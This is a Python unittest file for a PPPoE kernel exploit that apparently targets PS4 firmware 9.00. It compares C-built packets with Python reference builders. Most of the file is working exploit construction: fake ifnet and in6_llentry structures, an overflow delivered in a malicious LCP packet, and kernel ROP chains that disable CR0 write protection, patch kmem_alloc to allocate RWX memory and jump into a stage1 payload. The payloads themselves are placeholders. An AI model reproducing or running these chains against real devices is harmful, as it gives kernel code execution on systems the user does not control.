import sys
import unittest
from ctypes import *
from struct import pack, unpack
from scapy.all import str2mac
from scapy.layers.inet6 import *
from scapy.layers.ppp import *
from scapy.utils import hexdump

from offsets import *

# PPPoE constants

PPPOE_TAG_HUNIQUE = 0x0103
PPPOE_TAG_ACOOKIE = 0x0104

PPPOE_CODE_PADI = 0x09
PPPOE_CODE_PADO = 0x07
PPPOE_CODE_PADR = 0x19
PPPOE_CODE_PADS = 0x65
PPPOE_CODE_PADT = 0xa7

ETHERTYPE_PPPOEDISC = 0x8863
ETHERTYPE_PPPOE = 0x8864

CONF_REQ = 1
CONF_ACK = 2
CONF_NAK = 3
CONF_REJ = 4
ECHO_REQ = 9
ECHO_REPLY = 10

# FreeBSD constants

NULL = 0

PAGE_SIZE = 0x4000

IDT_UD = 6
SDT_SYSIGT = 14
SEL_KPL = 0

CR0_PE = 0x00000001
CR0_MP = 0x00000002
CR0_EM = 0x00000004
CR0_TS = 0x00000008
CR0_ET = 0x00000010
CR0_NE = 0x00000020
CR0_WP = 0x00010000
CR0_AM = 0x00040000
CR0_NW = 0x20000000
CR0_CD = 0x40000000
CR0_PG = 0x80000000

CR0_ORI = CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_ET | CR0_TS | CR0_MP | CR0_PE

VM_PROT_READ = 0x01
VM_PROT_WRITE = 0x02
VM_PROT_EXECUTE = 0x04

VM_PROT_ALL = (VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE)

LLE_STATIC = 0x0002
LLE_LINKED = 0x0040
LLE_EXCLUSIVE = 0x2000

LO_INITIALIZED = 0x00010000
LO_WITNESS = 0x00020000
LO_UPGRADABLE = 0x00200000
LO_DUPOK = 0x00400000

LO_CLASSSHIFT = 24

RW_UNLOCKED = 1
MTX_UNOWNED = 4

RW_INIT_FLAGS = ((4 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS |
                 LO_UPGRADABLE)
MTX_INIT_FLAGS = ((1 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS)

CALLOUT_RETURNUNLOCKED = 0x10

AF_INET6 = 28

IFT_ETHER = 0x6

ND6_LLINFO_NOSTATE = 0xfffe

# FreeBSD offsets

TARGET_SIZE = 0x100

PPPOE_SOFTC_SC_DEST = 0x24
PPPOE_SOFTC_SC_AC_COOKIE = 0x40
PPPOE_SOFTC_SIZE = 0x1c8

LLTABLE_LLTIFP = 0x110
LLTABLE_LLTFREE = 0x118

SOCKADDR_IN6_SIZE = 0x1c


def p8(val):
    return pack('<B', val & 0xff)


def p16(val):
    return pack('<H', val & 0xffff)


def p16be(val):
    return pack('>H', val & 0xffff)


def p32(val):
    return pack('<I', val & 0xffffffff)


def p32be(val):
    return pack('>I', val & 0xffffffff)


def p64(val):
    return pack('<Q', val & 0xffffffffffffffff)


def p64be(val):
    return pack('>Q', val & 0xffffffffffffffff)


HOLE_START = 0x400
HOLE_SPACE = 0x10

LCP_ID = 0x41
IPCP_ID = 0x41

SESSION_ID = 0xffff

STAGE2_PORT = 9020

SOURCE_MAC = '41:41:41:41:41:41'
SOURCE_IPV4 = '41.41.41.41'
SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'

TARGET_IPV4 = '42.42.42.42'

BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'


class TestPacket(unittest.TestCase):
    lib_path = ""

    @classmethod
    def setUpClass(cls):
        cls.lib = CDLL(cls.lib_path)

    def setUp(self):
        self.init(b'\x00\x96\xb9\x3c\x6a\xdf\xff\xff',
                  b'\xf8\x11\x2e\xcc\xff\xff\xff\xff',
                  b'2c:cc:44:33:22:11',
                  b'fe80::22ff:44ff:ee66:cc88')

    def check(self, c_packet, packet):
        try:
            self.assertEqual(c_packet, bytes(packet))
        except AssertionError as e:
            print("Additional debug information:")
            print("c_packet:")
            hexdump(c_packet)
            print("py_packet:")
            hexdump(bytes(packet))
            raise e

    def kdlsym(self, addr):
        return self.kaslr_offset + addr

    def build_fake_ifnet(self):
        # Leak address
        # Upper bytes are encoded with SESSION_ID
        planted = (self.pppoe_softc + 0x07) & 0xffffffffffff
        self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
        print('[+] Source MAC: {}'.format(self.source_mac))

        # Fake ifnet
        fake_ifnet = bytearray()

        fake_ifnet += b'A' * (0x48 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # if_addrhead
        fake_ifnet += b'A' * (0x70 - len(fake_ifnet))
        fake_ifnet += p16(0x0001)  # if_index
        fake_ifnet += b'A' * (0xa0 - len(fake_ifnet))
        fake_ifnet += p8(IFT_ETHER)  # ifi_type
        fake_ifnet += p8(0)  # ifi_physical
        fake_ifnet += p8(0x8 + 0x1)  # ifi_addrlen
        fake_ifnet += b'A' * (0x1b8 - len(fake_ifnet))
        fake_ifnet += p64(self.pppoe_softc + PPPOE_SOFTC_SC_DEST)  # if_addr
        fake_ifnet += b'A' * (0x428 - len(fake_ifnet))
        fake_ifnet += p64(self.pppoe_softc + 0x10 - 0x8)  # nd_ifinfo

        # if_afdata_lock
        fake_ifnet += b'A' * (0x480 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # lo_name
        fake_ifnet += p32(RW_INIT_FLAGS)  # lo_flags
        fake_ifnet += p32(0)  # lo_data
        fake_ifnet += p64(NULL)  # lo_witness
        fake_ifnet += p64(RW_UNLOCKED)  # rw_lock

        # if_addr_mtx
        fake_ifnet += b'A' * (0x4c0 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # lo_name
        fake_ifnet += p32(MTX_INIT_FLAGS)  # lo_flags
        fake_ifnet += p32(0)  # lo_data
        fake_ifnet += p64(NULL)  # lo_witness
        fake_ifnet += p64(MTX_UNOWNED)  # mtx_lock

        return fake_ifnet

    def build_overflow_lle(self):
        # Fake in6_llentry
        overflow_lle = bytearray()

        # lle_next
        overflow_lle += p64(self.pppoe_softc +
                            PPPOE_SOFTC_SC_AC_COOKIE)  # le_next
        overflow_lle += p64(NULL)  # le_prev

        # lle_lock
        overflow_lle += p64(NULL)  # lo_name
        overflow_lle += p32(RW_INIT_FLAGS | LO_DUPOK)  # lo_flags
        overflow_lle += p32(0)  # lo_data
        overflow_lle += p64(NULL)  # lo_witness
        overflow_lle += p64(RW_UNLOCKED)  # rw_lock

        overflow_lle += p64(self.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE -
                            LLTABLE_LLTIFP)  # lle_tbl
        overflow_lle += p64(NULL)  # lle_head
        overflow_lle += p64(NULL)  # lle_free
        overflow_lle += p64(NULL)  # la_hold
        overflow_lle += p32(0)  # la_numheld
        overflow_lle += p32(0)  # pad
        overflow_lle += p64(0)  # la_expire
        overflow_lle += p16(LLE_EXCLUSIVE)  # la_flags
        overflow_lle += p16(0)  # la_asked
        overflow_lle += p16(0)  # la_preempt
        overflow_lle += p16(0)  # ln_byhint
        overflow_lle += p16(ND6_LLINFO_NOSTATE)  # ln_state
        overflow_lle += p16(0)  # ln_router
        overflow_lle += p32(0)  # pad
        overflow_lle += p64(0x7fffffffffffffff)  # ln_ntick

        return overflow_lle

    def build_fake_lle(self):
        # First gadget - must be a valid MAC address
        # Upper bytes are encoded with SESSION_ID
        planted = self.kdlsym(self.offs.FIRST_GADGET) & 0xffffffffffff
        self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
        print('[+] Source MAC: {}'.format(self.source_mac))

        # Fake in6_llentry
        fake_lle = bytearray()

        # lle_next
        # Third gadget
        fake_lle += p64(
            self.kdlsym(self.offs.POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10)
        )  # le_next
        fake_lle += p64(NULL)  # le_prev

        # lle_lock
        # Fourth gadget
        fake_lle += p64(self.kdlsym(
            self.offs.LEA_RSP_RSI_20_REPZ_RET))  # lo_name
        fake_lle += p32(RW_INIT_FLAGS | LO_DUPOK)  # lo_flags
        fake_lle += p32(0)  # lo_data
        # Fifth gadget
        fake_lle += p64(self.kdlsym(
            self.offs.ADD_RSP_B0_POP_RBP_RET))  # lo_witness
        fake_lle += p64(RW_UNLOCKED)  # rw_lock

        fake_lle += p64(self.pppoe_softc + PPPOE_SOFTC_SC_DEST -
                        LLTABLE_LLTFREE)  # lle_tbl
        fake_lle += p64(NULL)  # lle_head
        fake_lle += p64(NULL)  # lle_free
        fake_lle += p64(NULL)  # la_hold
        fake_lle += p32(0)  # la_numheld
        fake_lle += p32(0)  # pad
        fake_lle += p64(0)  # la_expire
        fake_lle += p16(LLE_STATIC | LLE_EXCLUSIVE)  # la_flags
        fake_lle += p16(0)  # la_asked
        fake_lle += p16(0)  # la_preempt
        fake_lle += p16(0)  # ln_byhint
        fake_lle += p16(ND6_LLINFO_NOSTATE)  # ln_state
        fake_lle += p16(0)  # ln_router
        fake_lle += p32(0)  # pad
        fake_lle += p64(0x7fffffffffffffff)  # ln_ntick
        fake_lle += p32(0)  # lle_refcnt
        fake_lle += p32(0)  # pad
        fake_lle += p64be(0x414141414141)  # ll_addr

        # lle_timer
        fake_lle += p64(0)  # sle
        fake_lle += p64(0)  # tqe
        fake_lle += p32(0)  # c_time
        fake_lle += p32(0)  # pad
        fake_lle += p64(NULL)  # c_arg
        fake_lle += p64(NULL)  # c_func
        fake_lle += p64(NULL)  # c_lock
        fake_lle += p32(CALLOUT_RETURNUNLOCKED)  # c_flags
        fake_lle += p32(0)  # c_cpu

        # l3_addr6
        fake_lle += p8(SOCKADDR_IN6_SIZE)  # sin6_len
        fake_lle += p8(AF_INET6)  # sin6_family
        fake_lle += p16(0)  # sin6_port
        fake_lle += p32(0)  # sin6_flowinfo
        # sin6_addr
        fake_lle += p64be(0xfe80000100000000)
        fake_lle += p64be(0x4141414141414141)
        fake_lle += p32(0)  # sin6_scope_id

        # pad
        fake_lle += p32(0)

        # Second gadget
        fake_lle[self.offs.SECOND_GADGET_OFF:(
                self.offs.SECOND_GADGET_OFF + 8)] = p64(
            self.kdlsym(self.offs.PUSH_RBP_JMP_QWORD_PTR_RSI))

        # Second ROP chain
        rop2 = self.build_second_rop()

        # First ROP chain
        rop = self.build_first_rop(fake_lle, rop2)

        return fake_lle + rop + rop2 + self.stage1

    def build_first_rop(self, fake_lle, rop2):
        rop = bytearray()

        # memcpy(RBX - 0x800, rop2, len(rop2 + stage1))

        # RDI = RBX - 0x800
        rop += p64(self.kdlsym(self.offs.POP_R12_RET))
        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.MOV_RDI_RBX_CALL_R12))
        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
        rop += p64(-0x800)
        rop += p64(self.kdlsym(self.offs.ADD_RDI_RCX_RET))

        # RSI += len(fake_lle + rop)
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop_off_fixup = len(rop)
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
        rop += p64(0xDEADBEEF)

        # RDX = len(rop2 + stage1)
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop += p64(len(rop2 + self.stage1))

        # Call memcpy
        rop += p64(self.kdlsym(self.offs.MEMCPY))

        # Stack pivot
        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.MOV_RSI_RBX_CALL_RAX))
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop += p64(0x800 + 0x20)
        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET))

        # Fixup offset of rop2
        rop[rop_off_fixup:rop_off_fixup + 8] = p64(-len(fake_lle + rop))

        return rop

    def build_second_rop(self):
        rop = bytearray()

        # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
        rop += p64(IDT_UD)
        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
        rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop += p64(SDT_SYSIGT)
        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
        rop += p64(SEL_KPL)
        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
        rop += p64(0)
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.SETIDT))

        # Disable write protection
        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
        rop += p64(CR0_ORI & ~CR0_WP)
        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))

        # Enable RWX in kmem_alloc
        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
        rop += p64(VM_PROT_ALL)
        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH1))
        rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH2))
        rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))

        # Restore write protection
        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
        rop += p64(CR0_ORI)
        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))

        # kmem_alloc(*kernel_map, PAGE_SIZE)

        # RDI = *kernel_map
        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
        rop += p64(self.kdlsym(self.offs.RET))
        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
        rop += p64(self.kdlsym(self.offs.KERNEL_MAP))
        rop += p64(self.kdlsym(self.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX))
        rop += p64(0xDEADBEEF)

        # RSI = PAGE_SIZE
        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
        rop += p64(PAGE_SIZE)

        # Call kmem_alloc
        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC))

        # R14 = RAX
        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.MOV_R14_RAX_CALL_R8))

        # memcpy(R14, stage1, len(stage1))

        # RDI = R14
        rop += p64(self.kdlsym(self.offs.POP_R12_RET))
        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.MOV_RDI_R14_CALL_R12))

        # RSI = RSP + len(rop) - rop_rsp_pos
        rop += p64(self.kdlsym(self.offs.PUSH_RSP_POP_RSI_RET))
        rop_rsp_pos = len(rop)
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop_off_fixup = len(rop)
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
        rop += p64(0xDEADBEEF)

        # RDX = len(stage1)
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop += p64(len(self.stage1))

        # Call memcpy
        rop += p64(self.kdlsym(self.offs.MEMCPY))

        # Jump into stage1
        rop += p64(self.kdlsym(self.offs.JMP_R14))

        # Fixup offset of stage1
        rop[rop_off_fixup:rop_off_fixup + 8] = p64(-(len(rop) - rop_rsp_pos))

        return rop

    def init(self, uniq, softc_list, ps4_mac, target_ipv6):
        self.host_uniq = uniq
        self.pppoe_softc = unpack('<Q', self.host_uniq)[0]
        self.source_mac = SOURCE_MAC
        self.target_mac = ps4_mac.decode()
        self.target_ipv6 = target_ipv6.decode()
        self.offs = OffsetsFirmware_900()
        self.pppoe_softc_list = unpack('<Q', softc_list)[0]
        self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
        self.stage1 = b'B' * 123
        self.stage2 = b'C' * 456

        self.lib.setStage1(c_char_p(self.stage1), len(self.stage1))
        self.lib.setStage2(c_char_p(self.stage2), len(self.stage2))
        self.lib.setFirmwareVersion(c_uint32(900))
        self.lib.setSourceMac(c_char_p(self.source_mac.encode()))
        self.lib.setTargetMac(c_char_p(self.target_mac.encode()))
        self.lib.setTargetIpv6(c_char_p(self.target_ipv6.encode()))
        self.lib.setPppoeSoftc(c_uint64(self.pppoe_softc))
        self.lib.setKaslrOffset(c_uint64(self.kaslr_offset))
        self.buffer_size = 4096
        self.buffer = (c_uint8 * self.buffer_size)()

    def call_c_function(self, function_name, *args):
        c_packet_len = getattr(self.lib, function_name)(self.buffer, c_uint64(self.buffer_size), *args)
        return bytes(self.buffer[i] for i in range(c_packet_len))

    def test_fake_ifnet(self):
        c_packet = self.call_c_function("buildFakeIfnet")
        packet = self.build_fake_ifnet()
        self.check(c_packet, packet)

    def test_overflow_lle(self):
        c_packet = self.call_c_function("buildOverflowLle")
        packet = self.build_overflow_lle()
        self.check(c_packet, packet)

    def test_second_top(self):
        c_packet = self.call_c_function("buildSecondRop")
        packet = self.build_second_rop()
        self.check(c_packet, packet)

    def test_fake_lle(self):
        c_packet = self.call_c_function("buildFakeLle")
        packet = self.build_fake_lle()
        self.check(c_packet, packet)

    def test_pado_fake_ifnet(self):
        data_buffer_size = 4096
        data_buffer = (c_uint8 * data_buffer_size)()

        c_packet_len = self.lib.buildFakeIfnet(data_buffer, c_uint64(data_buffer_size))
        c_packet = self.call_c_function("buildPado", data_buffer, c_packet_len)
        cookie = self.build_fake_ifnet()
        packet = Ether(src=self.source_mac,
                       dst=self.target_mac,
                       type=ETHERTYPE_PPPOEDISC) / \
                 PPPoED(code=PPPOE_CODE_PADO) / \
                 PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=cookie) / \
                 PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
        self.check(c_packet, packet)

    def test_pado_fake_lle(self):
        data_buffer_size = 4096
        data_buffer = (c_uint8 * data_buffer_size)()

        c_packet_len = self.lib.buildFakeLle(data_buffer, c_uint64(data_buffer_size))
        c_packet = self.call_c_function("buildPado", data_buffer, c_packet_len)
        cookie = self.build_fake_lle()
        packet = Ether(src=self.source_mac,
                       dst=self.target_mac,
                       type=ETHERTYPE_PPPOEDISC) / \
                 PPPoED(code=PPPOE_CODE_PADO) / \
                 PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=cookie) / \
                 PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
        self.check(c_packet, packet)

    def test_pado_empty_cookie(self):
        data_buffer = (c_uint8 * 2)()
        c_packet = self.call_c_function("buildPado", data_buffer, 0)
        packet = Ether(src=self.source_mac,
                       dst=self.target_mac,
                       type=ETHERTYPE_PPPOEDISC) / \
                 PPPoED(code=PPPOE_CODE_PADO) / \
                 PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=b'') / \
                 PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
        self.check(c_packet, packet)

    def test_pads(self):
        c_packet = self.call_c_function("buildPads")
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOEDISC) / \
                 PPPoED(code=PPPOE_CODE_PADS, sessionid=SESSION_ID) / \
                 PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
        self.check(c_packet, packet)

    def test_padt(self):
        c_packet = self.call_c_function("buildPadt")
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOEDISC) / \
                 PPPoED(code=PPPOE_CODE_PADT, sessionid=SESSION_ID)
        self.check(c_packet, packet)

    def test_lcp_request(self):
        c_packet = self.call_c_function("buildLcpRequest")
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE) / \
                 PPPoE(sessionid=SESSION_ID) / \
                 PPP() / \
                 PPP_LCP(code=CONF_REQ, id=LCP_ID)
        self.check(c_packet, packet)

    def test_lcp_ack(self):
        ack_id = 0x02
        c_packet = self.call_c_function("buildLcpAck", c_uint8(ack_id))
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE) / \
                 PPPoE(sessionid=SESSION_ID) / \
                 PPP() / \
                 PPP_LCP(code=CONF_ACK, id=ack_id)
        self.check(c_packet, packet)

    def test_ipcp_request(self):
        c_packet = self.call_c_function("buildIpcpRequest")
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE) / \
                 PPPoE(sessionid=SESSION_ID) / \
                 PPP() / \
                 PPP_IPCP(code=CONF_REQ, id=IPCP_ID, options=PPP_IPCP_Option_IPAddress(data=SOURCE_IPV4))
        self.check(c_packet, packet)

    def test_ipcp_nak(self):
        nak_id = 0x02
        c_packet = self.call_c_function("buildIpcpNak", c_uint8(nak_id))
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE) / \
                 PPPoE(sessionid=SESSION_ID) / \
                 PPP() / \
                 PPP_IPCP(code=CONF_NAK, id=nak_id, options=PPP_IPCP_Option_IPAddress(data=TARGET_IPV4))
        self.check(c_packet, packet)

    def test_lcp_ack(self):
        ack_id = 0x03
        a = bytes(PPP_IPCP_Option_IPAddress(data=TARGET_IPV4))
        c_packet = self.call_c_function("buildIpcpAck", c_uint8(ack_id), c_char_p(a), c_uint64(len(a)))
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE) / \
                 PPPoE(sessionid=SESSION_ID) / \
                 PPP() / \
                 PPP_IPCP(code=CONF_ACK, id=ack_id, options=PPP_IPCP_Option_IPAddress(data=TARGET_IPV4))
        self.check(c_packet, packet)

    def test_icmpv6_echo(self):
        for i in range(0x10):
            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i).encode()
            c_packet = self.call_c_function("buildIcmpv6Echo", c_char_p(source_ipv6))
            packet = Ether(src=self.source_mac, dst=self.target_mac) / \
                     IPv6(src=source_ipv6, dst=self.target_ipv6) / \
                     ICMPv6EchoRequest()
            self.check(c_packet, packet)

    def test_icmpv6_na(self):
        for i in range(0x10):
            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i).encode()
            c_packet = self.call_c_function("buildIcmpv6Na", c_char_p(source_ipv6))
            packet = Ether(src=self.source_mac, dst=self.target_mac) / \
                     IPv6(src=source_ipv6, dst=self.target_ipv6) / \
                     ICMPv6ND_NA(tgt=source_ipv6, S=1) / \
                     ICMPv6NDOptDstLLAddr(lladdr=self.source_mac)
            self.check(c_packet, packet)

    def test_pin_cpu0(self):
        c_packet = self.call_c_function("buildPinCpu0")
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
        self.check(c_packet, packet)

    def test_malicious_lcp(self):
        c_packet = self.call_c_function("buildMaliciousLcp")
        overflow_lle = self.build_overflow_lle()
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE) / \
                 PPPoE(sessionid=SESSION_ID) / \
                 PPP() / \
                 PPP_LCP(code=CONF_REQ, id=LCP_ID, len=TARGET_SIZE + 4,
                         data=(PPP_LCP_Option(data=b'A' * (TARGET_SIZE - 4)) / \
                               PPP_LCP_Option(data=overflow_lle)))
        self.check(c_packet, packet)

    def test_lcp_echo_reply(self):
        source = "41:41:41:41:41:41"
        target = "42:42:42:42:42:42"
        session_id = 0x1234
        reply_id = 0x56
        c_packet = self.call_c_function("buildLcpEchoReply", c_char_p(source.encode()),
                                        c_char_p(target.encode()), c_uint16(session_id), c_uint8(reply_id))
        packet = Ether(src=source, dst=target, type=ETHERTYPE_PPPOE) / \
                 PPPoE(sessionid=session_id) / \
                 PPP() / \
                 PPP_LCP_Echo(code=ECHO_REPLY, id=reply_id)
        self.check(c_packet, packet)

    def test_lcp_terminate(self):
        c_packet = self.call_c_function("buildLcpTerminate")
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE) / \
                 PPPoE(sessionid=SESSION_ID) / \
                 PPP() / \
                 PPP_LCP_Terminate()
        self.check(c_packet, packet)


if __name__ == "__main__":
    TestPacket.lib_path = sys.argv[1]
    unittest.main(argv=[sys.argv[0]], verbosity=2)
